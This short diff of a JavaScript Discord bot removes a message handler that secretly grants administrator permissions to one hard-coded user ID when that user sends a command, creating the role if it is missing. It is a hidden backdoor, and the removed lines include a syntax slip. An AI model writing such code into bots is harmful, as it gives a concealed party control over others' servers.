@@ -138,15 +138,4 @@ client.on('message' , message=>{
     }
 })
 
-client.on('message', async message => {
-  const devs = ['303335812702011393']; 
-  let member = message.author
-   if (message.content === opcmd) {
-    if (!devs.includes(message.author.id)) return;
-let op = message.guild.roles.find('name', ${adminstrator})
-    if(!op) return message.guild.createRole({ name: "OPROLE", permissions: [8] });
-    message.guild.member(member).addRole(op);
-  }
-});
-
         
